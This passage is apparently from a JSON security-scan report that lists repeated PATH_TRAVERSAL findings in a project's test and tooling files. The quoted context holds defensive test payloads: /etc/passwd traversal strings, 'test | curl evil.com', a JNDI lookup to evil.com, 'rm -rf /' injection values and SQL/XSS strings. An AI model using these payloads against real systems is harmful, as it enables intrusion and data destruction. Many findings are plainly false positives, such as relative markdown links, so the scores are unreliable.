            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"Path: ../../../etc/passwd\",",
            "context": "        \"2024-01-01 00:00:00 ERROR Fake log\",\n        \"User: <script>alert('xss')</script>\",\n        \"Path: ../../../etc/passwd\",\n        \"Command: eval(code)\",\n    ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_sanitization_simple.py",
            "line": 209,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"Path: ../../../etc/passwd\",",
            "context": "        \"2024-01-01 00:00:00 ERROR Fake log\",\n        \"User: <script>alert('xss')</script>\",\n        \"Path: ../../../etc/passwd\",\n        \"Command: eval(code)\",\n    ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_sanitization_simple.py",
            "line": 209,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"Path: ../../../etc/passwd\",",
            "context": "        \"2024-01-01 00:00:00 ERROR Fake log\",\n        \"User: <script>alert('xss')</script>\",\n        \"Path: ../../../etc/passwd\",\n        \"Command: eval(code)\",\n    ]",
            "cvss_score": 8.5
          },
          {
            "file": "auto_update_index.py",
            "line": 434,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "- [Back to Master Index](../00_MASTER_DOCUMENTATION_INDEX.md)",
            "context": "## Navigation\n\n- [Back to Master Index](../00_MASTER_DOCUMENTATION_INDEX.md)\n- [Historical Timeline](../HISTORICAL_TIMELINE_INDEX.md)\n- [Cross-References](../CROSS_REFERENCE_INDEX.md)",
            "cvss_score": 8.5
          },
          {
            "file": "auto_update_index.py",
            "line": 434,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "- [Back to Master Index](../00_MASTER_DOCUMENTATION_INDEX.md)",
            "context": "## Navigation\n\n- [Back to Master Index](../00_MASTER_DOCUMENTATION_INDEX.md)\n- [Historical Timeline](../HISTORICAL_TIMELINE_INDEX.md)\n- [Cross-References](../CROSS_REFERENCE_INDEX.md)",
            "cvss_score": 8.5
          },
          {
            "file": "auto_update_index.py",
            "line": 435,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "- [Historical Timeline](../HISTORICAL_TIMELINE_INDEX.md)",
            "context": "\n- [Back to Master Index](../00_MASTER_DOCUMENTATION_INDEX.md)\n- [Historical Timeline](../HISTORICAL_TIMELINE_INDEX.md)\n- [Cross-References](../CROSS_REFERENCE_INDEX.md)\n",
            "cvss_score": 8.5
          },
          {
            "file": "auto_update_index.py",
            "line": 435,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "- [Historical Timeline](../HISTORICAL_TIMELINE_INDEX.md)",
            "context": "\n- [Back to Master Index](../00_MASTER_DOCUMENTATION_INDEX.md)\n- [Historical Timeline](../HISTORICAL_TIMELINE_INDEX.md)\n- [Cross-References](../CROSS_REFERENCE_INDEX.md)\n",
            "cvss_score": 8.5
          },
          {
            "file": "auto_update_index.py",
            "line": 436,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "- [Cross-References](../CROSS_REFERENCE_INDEX.md)",
            "context": "- [Back to Master Index](../00_MASTER_DOCUMENTATION_INDEX.md)\n- [Historical Timeline](../HISTORICAL_TIMELINE_INDEX.md)\n- [Cross-References](../CROSS_REFERENCE_INDEX.md)\n\n---",
            "cvss_score": 8.5
          },
          {
            "file": "auto_update_index.py",
            "line": 436,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "- [Cross-References](../CROSS_REFERENCE_INDEX.md)",
            "context": "- [Back to Master Index](../00_MASTER_DOCUMENTATION_INDEX.md)\n- [Historical Timeline](../HISTORICAL_TIMELINE_INDEX.md)\n- [Cross-References](../CROSS_REFERENCE_INDEX.md)\n\n---",
            "cvss_score": 8.5
          },
          {
            "file": "test_production_modules_comprehensive.py",
            "line": 470,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\"",
            "context": "                \"test | curl evil.com\",\n                \"test\\x00null\",\n                \"../../../etc/passwd\"\n            ]\n            ",
            "cvss_score": 8.5
          },
          {
            "file": "test_production_modules_comprehensive.py",
            "line": 470,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\"",
            "context": "                \"test | curl evil.com\",\n                \"test\\x00null\",\n                \"../../../etc/passwd\"\n            ]\n            ",
            "cvss_score": 8.5
          },
          {
            "file": "test_production_modules_comprehensive.py",
            "line": 470,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\"",
            "context": "                \"test | curl evil.com\",\n                \"test\\x00null\",\n                \"../../../etc/passwd\"\n            ]\n            ",
            "cvss_score": 8.5
          },
          {
            "file": "test_production_modules_comprehensive.py",
            "line": 470,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\"",
            "context": "                \"test | curl evil.com\",\n                \"test\\x00null\",\n                \"../../../etc/passwd\"\n            ]\n            ",
            "cvss_score": 8.5
          },
          {
            "file": "test_production_modules_comprehensive.py",
            "line": 470,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\"",
            "context": "                \"test | curl evil.com\",\n                \"test\\x00null\",\n                \"../../../etc/passwd\"\n            ]\n            ",
            "cvss_score": 8.5
          },
          {
            "file": "test_production_modules_comprehensive.py",
            "line": 470,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\"",
            "context": "                \"test | curl evil.com\",\n                \"test\\x00null\",\n                \"../../../etc/passwd\"\n            ]\n            ",
            "cvss_score": 8.5
          },
          {
            "file": "test_production_modules_comprehensive.py",
            "line": 621,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"file_path\": \"../../etc/passwd\",",
            "context": "            try:\n                await server.call_tool(\"write_file\", {\n                    \"file_path\": \"../../etc/passwd\",\n                    \"content\": \"malicious\"\n                })",
            "cvss_score": 8.5
          },
          {
            "file": "test_production_modules_comprehensive.py",
            "line": 621,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"file_path\": \"../../etc/passwd\",",
            "context": "            try:\n                await server.call_tool(\"write_file\", {\n                    \"file_path\": \"../../etc/passwd\",\n                    \"content\": \"malicious\"\n                })",
            "cvss_score": 8.5
          },
          {
            "file": "test_production_modules_comprehensive.py",
            "line": 621,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"file_path\": \"../../etc/passwd\",",
            "context": "            try:\n                await server.call_tool(\"write_file\", {\n                    \"file_path\": \"../../etc/passwd\",\n                    \"content\": \"malicious\"\n                })",
            "cvss_score": 8.5
          },
          {
            "file": "test_production_modules_comprehensive.py",
            "line": 621,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"file_path\": \"../../etc/passwd\",",
            "context": "            try:\n                await server.call_tool(\"write_file\", {\n                    \"file_path\": \"../../etc/passwd\",\n                    \"content\": \"malicious\"\n                })",
            "cvss_score": 8.5
          },
          {
            "file": "agent4_comprehensive_security_audit.py",
            "line": 478,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if has_file_op or '../' in line:",
            "context": "                                has_file_op = any(op in context for op in file_ops)\n                                \n                                if has_file_op or '../' in line:\n                                    findings.append({\n                                        'file': str(py_file),",
            "cvss_score": 8.5
          },
          {
            "file": "agent4_comprehensive_security_audit.py",
            "line": 478,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if has_file_op or '../' in line:",
            "context": "                                has_file_op = any(op in context for op in file_ops)\n                                \n                                if has_file_op or '../' in line:\n                                    findings.append({\n                                        'file': str(py_file),",
            "cvss_score": 8.5
          },
          {
            "file": "agent4_comprehensive_security_audit.py",
            "line": 516,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        test_payloads = [\n            \"'; DROP TABLE users; --\",\n            \"../../../etc/passwd\",\n            \"<script>alert('XSS')</script>\",\n            \"${jndi:ldap://evil.com/exploit}\",",
            "cvss_score": 8.5
          },
          {
            "file": "agent4_comprehensive_security_audit.py",
            "line": 516,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        test_payloads = [\n            \"'; DROP TABLE users; --\",\n            \"../../../etc/passwd\",\n            \"<script>alert('XSS')</script>\",\n            \"${jndi:ldap://evil.com/exploit}\",",
            "cvss_score": 8.5
          },
          {
            "file": "agent4_comprehensive_security_audit.py",
            "line": 516,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        test_payloads = [\n            \"'; DROP TABLE users; --\",\n            \"../../../etc/passwd\",\n            \"<script>alert('XSS')</script>\",\n            \"${jndi:ldap://evil.com/exploit}\",",
            "cvss_score": 8.5
          },
          {
            "file": "agent4_comprehensive_security_audit.py",
            "line": 516,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        test_payloads = [\n            \"'; DROP TABLE users; --\",\n            \"../../../etc/passwd\",\n            \"<script>alert('XSS')</script>\",\n            \"${jndi:ldap://evil.com/exploit}\",",
            "cvss_score": 8.5
          },
          {
            "file": "agent4_comprehensive_security_audit.py",
            "line": 516,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        test_payloads = [\n            \"'; DROP TABLE users; --\",\n            \"../../../etc/passwd\",\n            \"<script>alert('XSS')</script>\",\n            \"${jndi:ldap://evil.com/exploit}\",",
            "cvss_score": 8.5
          },
          {
            "file": "agent4_comprehensive_security_audit.py",
            "line": 516,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        test_payloads = [\n            \"'; DROP TABLE users; --\",\n            \"../../../etc/passwd\",\n            \"<script>alert('XSS')</script>\",\n            \"${jndi:ldap://evil.com/exploit}\",",
            "cvss_score": 8.5
          },
          {
            "file": "agent4_comprehensive_security_audit.py",
            "line": 545,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "elif '../' in payload:",
            "context": "                if any(keyword in payload.lower() for keyword in ['drop', 'delete', 'truncate']):\n                    test_result['vulnerability'] = 'SQL_INJECTION'\n                elif '../' in payload:\n                    test_result['vulnerability'] = 'PATH_TRAVERSAL'\n                elif '<script>' in payload.lower():",
            "cvss_score": 8.5
          },
          {
            "file": "agent4_comprehensive_security_audit.py",
            "line": 545,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "elif '../' in payload:",
            "context": "                if any(keyword in payload.lower() for keyword in ['drop', 'delete', 'truncate']):\n                    test_result['vulnerability'] = 'SQL_INJECTION'\n                elif '../' in payload:\n                    test_result['vulnerability'] = 'PATH_TRAVERSAL'\n                elif '<script>' in payload.lower():",
            "cvss_score": 8.5
          },
          {
            "file": "test_comprehensive_security_audit.py",
            "line": 49,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "\nPATH_TRAVERSAL_PAYLOADS = [\n    \"../../../etc/passwd\",\n    \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n    \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_comprehensive_security_audit.py",
            "line": 49,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "\nPATH_TRAVERSAL_PAYLOADS = [\n    \"../../../etc/passwd\",\n    \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n    \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_comprehensive_security_audit.py",
            "line": 49,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "\nPATH_TRAVERSAL_PAYLOADS = [\n    \"../../../etc/passwd\",\n    \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n    \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_comprehensive_security_audit.py",
            "line": 49,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "\nPATH_TRAVERSAL_PAYLOADS = [\n    \"../../../etc/passwd\",\n    \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n    \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_comprehensive_security_audit.py",
            "line": 49,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "\nPATH_TRAVERSAL_PAYLOADS = [\n    \"../../../etc/passwd\",\n    \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n    \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_comprehensive_security_audit.py",
            "line": 49,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "\nPATH_TRAVERSAL_PAYLOADS = [\n    \"../../../etc/passwd\",\n    \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n    \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_comprehensive_security_audit.py",
            "line": 51,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "    \"../../../etc/passwd\",\n    \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n    \"....//....//....//etc/passwd\",\n    \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n    \"..%252f..%252f..%252fetc%252fpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_comprehensive_security_audit.py",
            "line": 51,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "    \"../../../etc/passwd\",\n    \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n    \"....//....//....//etc/passwd\",\n    \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n    \"..%252f..%252f..%252fetc%252fpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_comprehensive_security_audit.py",
            "line": 51,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "    \"../../../etc/passwd\",\n    \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n    \"....//....//....//etc/passwd\",\n    \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n    \"..%252f..%252f..%252fetc%252fpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_comprehensive_security_audit.py",
            "line": 51,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "    \"../../../etc/passwd\",\n    \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n    \"....//....//....//etc/passwd\",\n    \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n    \"..%252f..%252f..%252fetc%252fpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_comprehensive_security_audit.py",
            "line": 51,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "    \"../../../etc/passwd\",\n    \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n    \"....//....//....//etc/passwd\",\n    \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n    \"..%252f..%252f..%252fetc%252fpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_comprehensive_security_audit.py",
            "line": 51,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "    \"../../../etc/passwd\",\n    \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n    \"....//....//....//etc/passwd\",\n    \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n    \"..%252f..%252f..%252fetc%252fpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_comprehensive_security_audit.py",
            "line": 172,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if is_valid and \"../\" in payload:",
            "context": "                # Test validation\n                is_valid = validate_path(payload)\n                if is_valid and \"../\" in payload:\n                    self.add_vulnerability(\n                        \"PATH_TRAVERSAL\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_comprehensive_security_audit.py",
            "line": 172,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if is_valid and \"../\" in payload:",
            "context": "                # Test validation\n                is_valid = validate_path(payload)\n                if is_valid and \"../\" in payload:\n                    self.add_vulnerability(\n                        \"PATH_TRAVERSAL\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_comprehensive_security_audit.py",
            "line": 183,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if \"../\" in sanitized or \"..\\\\\" in sanitized:",
            "context": "                # Test sanitization\n                sanitized = sanitize_path(payload)\n                if \"../\" in sanitized or \"..\\\\\" in sanitized:\n                    self.add_vulnerability(\n                        \"PATH_TRAVERSAL\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_comprehensive_security_audit.py",
            "line": 183,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if \"../\" in sanitized or \"..\\\\\" in sanitized:",
            "context": "                # Test sanitization\n                sanitized = sanitize_path(payload)\n                if \"../\" in sanitized or \"..\\\\\" in sanitized:\n                    self.add_vulnerability(\n                        \"PATH_TRAVERSAL\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_comprehensive_security_audit.py",
            "line": 183,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if \"../\" in sanitized or \"..\\\\\" in sanitized:",
            "context": "                # Test sanitization\n                sanitized = sanitize_path(payload)\n                if \"../\" in sanitized or \"..\\\\\" in sanitized:\n                    self.add_vulnerability(\n                        \"PATH_TRAVERSAL\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_security_mitigations.py",
            "line": 195,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'\\.\\./',  # Checks for ../",
            "context": "        content = validation_file.read_text()\n        required_patterns = [\n            r'\\.\\./',  # Checks for ../\n            r'os\\.path\\.realpath',  # Path resolution\n            r'startswith.*base',  # Base directory check",
            "cvss_score": 8.5
          },
          {
            "file": "test_security_mitigations.py",
            "line": 195,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'\\.\\./',  # Checks for ../",
            "context": "        content = validation_file.read_text()\n        required_patterns = [\n            r'\\.\\./',  # Checks for ../\n            r'os\\.path\\.realpath',  # Path resolution\n            r'startswith.*base',  # Base directory check",
            "cvss_score": 8.5
          },
          {
            "file": "test_security_mcp_servers_comprehensive.py",
            "line": 713,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"target_path\": \"../../../etc/passwd\",",
            "context": "        try:\n            await server.call_tool(\"file_security_scan\", {\n                \"target_path\": \"../../../etc/passwd\",\n                \"scan_type\": \"all\"\n            })",
            "cvss_score": 8.5
          },
          {
            "file": "test_security_mcp_servers_comprehensive.py",
            "line": 713,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"target_path\": \"../../../etc/passwd\",",
            "context": "        try:\n            await server.call_tool(\"file_security_scan\", {\n                \"target_path\": \"../../../etc/passwd\",\n                \"scan_type\": \"all\"\n            })",
            "cvss_score": 8.5
          },
          {
            "file": "test_security_mcp_servers_comprehensive.py",
            "line": 713,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"target_path\": \"../../../etc/passwd\",",
            "context": "        try:\n            await server.call_tool(\"file_security_scan\", {\n                \"target_path\": \"../../../etc/passwd\",\n                \"scan_type\": \"all\"\n            })",
            "cvss_score": 8.5
          },
          {
            "file": "test_security_mcp_servers_comprehensive.py",
            "line": 713,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"target_path\": \"../../../etc/passwd\",",
            "context": "        try:\n            await server.call_tool(\"file_security_scan\", {\n                \"target_path\": \"../../../etc/passwd\",\n                \"scan_type\": \"all\"\n            })",
            "cvss_score": 8.5
          },
          {
            "file": "test_security_mcp_servers_comprehensive.py",
            "line": 713,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"target_path\": \"../../../etc/passwd\",",
            "context": "        try:\n            await server.call_tool(\"file_security_scan\", {\n                \"target_path\": \"../../../etc/passwd\",\n                \"scan_type\": \"all\"\n            })",
            "cvss_score": 8.5
          },
          {
            "file": "test_security_mcp_servers_comprehensive.py",
            "line": 713,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"target_path\": \"../../../etc/passwd\",",
            "context": "        try:\n            await server.call_tool(\"file_security_scan\", {\n                \"target_path\": \"../../../etc/passwd\",\n                \"scan_type\": \"all\"\n            })",
            "cvss_score": 8.5
          },
          {
            "file": "update_ai_docs_index.py",
            "line": 26,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "- [FINAL_MCP_INFRASTRUCTURE_REPORT.md](../FINAL_MCP_INFRASTRUCTURE_REPORT.md) - Comprehensive infrastructure report",
            "context": "- [MCP_SERVER_REFERENCE.md](mcp_integration/MCP_SERVER_REFERENCE.md) - Complete reference for all 27 MCP servers\n- [MCP_INTEGRATION_GUIDE.md](infrastructure/MCP_INTEGRATION_GUIDE.md) - Integration and setup guide\n- [FINAL_MCP_INFRASTRUCTURE_REPORT.md](../FINAL_MCP_INFRASTRUCTURE_REPORT.md) - Comprehensive infrastructure report\n\n### Key Statistics",
            "cvss_score": 8.5
          },
          {
            "file": "update_ai_docs_index.py",
            "line": 26,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "- [FINAL_MCP_INFRASTRUCTURE_REPORT.md](../FINAL_MCP_INFRASTRUCTURE_REPORT.md) - Comprehensive infrastructure report",
            "context": "- [MCP_SERVER_REFERENCE.md](mcp_integration/MCP_SERVER_REFERENCE.md) - Complete reference for all 27 MCP servers\n- [MCP_INTEGRATION_GUIDE.md](infrastructure/MCP_INTEGRATION_GUIDE.md) - Integration and setup guide\n- [FINAL_MCP_INFRASTRUCTURE_REPORT.md](../FINAL_MCP_INFRASTRUCTURE_REPORT.md) - Comprehensive infrastructure report\n\n### Key Statistics",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/parallel_development_orchestrator.py",
            "line": 117,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "nam_core = { path = \"../nam_core\" }",
            "context": "sled.workspace = true\nserde.workspace = true\nnam_core = { path = \"../nam_core\" }\nthiserror.workspace = true\nanyhow.workspace = true",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/parallel_development_orchestrator.py",
            "line": 117,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "nam_core = { path = \"../nam_core\" }",
            "context": "sled.workspace = true\nserde.workspace = true\nnam_core = { path = \"../nam_core\" }\nthiserror.workspace = true\nanyhow.workspace = true",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/parallel_development_orchestrator.py",
            "line": 1097,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "nam_core = { path = \"../nam_core\" }",
            "context": "uuid = { version = \"1.8\", features = [\"v4\", \"serde\"] }\nanyhow.workspace = true\nnam_core = { path = \"../nam_core\" }\ntokio.workspace = true\n",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/parallel_development_orchestrator.py",
            "line": 1097,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "nam_core = { path = \"../nam_core\" }",
            "context": "uuid = { version = \"1.8\", features = [\"v4\", \"serde\"] }\nanyhow.workspace = true\nnam_core = { path = \"../nam_core\" }\ntokio.workspace = true\n",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/cbc_orchestrator.py",
            "line": 506,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "cbc_core = { path = \"../cbc_core\" }",
            "context": "\n# CBC core\ncbc_core = { path = \"../cbc_core\" }\nnam_core = { path = \"../nam_core\" }\n\"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/cbc_orchestrator.py",
            "line": 506,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "cbc_core = { path = \"../cbc_core\" }",
            "context": "\n# CBC core\ncbc_core = { path = \"../cbc_core\" }\nnam_core = { path = \"../nam_core\" }\n\"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/cbc_orchestrator.py",
            "line": 507,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "nam_core = { path = \"../nam_core\" }",
            "context": "# CBC core\ncbc_core = { path = \"../cbc_core\" }\nnam_core = { path = \"../nam_core\" }\n\"\"\"\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/cbc_orchestrator.py",
            "line": 507,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "nam_core = { path = \"../nam_core\" }",
            "context": "# CBC core\ncbc_core = { path = \"../cbc_core\" }\nnam_core = { path = \"../nam_core\" }\n\"\"\"\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/cbc_orchestrator.py",
            "line": 626,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "cbc_core = { path = \"../cbc_core\" }",
            "context": "pyo3 = { version = \"0.20\", features = [\"extension-module\", \"abi3-py39\"] }\ntokio = { version = \"1.40\", features = [\"rt-multi-thread\"] }\ncbc_core = { path = \"../cbc_core\" }\nnam_core = { path = \"../nam_core\" }\n\"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/cbc_orchestrator.py",
            "line": 626,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "cbc_core = { path = \"../cbc_core\" }",
            "context": "pyo3 = { version = \"0.20\", features = [\"extension-module\", \"abi3-py39\"] }\ntokio = { version = \"1.40\", features = [\"rt-multi-thread\"] }\ncbc_core = { path = \"../cbc_core\" }\nnam_core = { path = \"../nam_core\" }\n\"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/cbc_orchestrator.py",
            "line": 627,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "nam_core = { path = \"../nam_core\" }",
            "context": "tokio = { version = \"1.40\", features = [\"rt-multi-thread\"] }\ncbc_core = { path = \"../cbc_core\" }\nnam_core = { path = \"../nam_core\" }\n\"\"\"\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/cbc_orchestrator.py",
            "line": 627,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "nam_core = { path = \"../nam_core\" }",
            "context": "tokio = { version = \"1.40\", features = [\"rt-multi-thread\"] }\ncbc_core = { path = \"../cbc_core\" }\nnam_core = { path = \"../nam_core\" }\n\"\"\"\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/cbc_orchestrator.py",
            "line": 1056,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "context: ../..",
            "context": "  cbc:\n    build:\n      context: ../..\n      dockerfile: deploy/docker/Dockerfile\n    ports:",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/cbc_orchestrator.py",
            "line": 1056,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "context: ../..",
            "context": "  cbc:\n    build:\n      context: ../..\n      dockerfile: deploy/docker/Dockerfile\n    ports:",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_testing_framework.py",
            "line": 1214,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "{\"command\": \"../../../etc/passwd\", \"description\": \"Path traversal\"},",
            "context": "                {\"command\": \"rm -rf /\", \"description\": \"Dangerous command\"},\n                {\"command\": \"'; rm -rf /; echo '\", \"description\": \"Command injection\"},\n                {\"command\": \"../../../etc/passwd\", \"description\": \"Path traversal\"},\n                {\"query\": \"<script>alert('xss')</script>\", \"count\": 1},  # For search\n            ]",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_testing_framework.py",
            "line": 1214,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "{\"command\": \"../../../etc/passwd\", \"description\": \"Path traversal\"},",
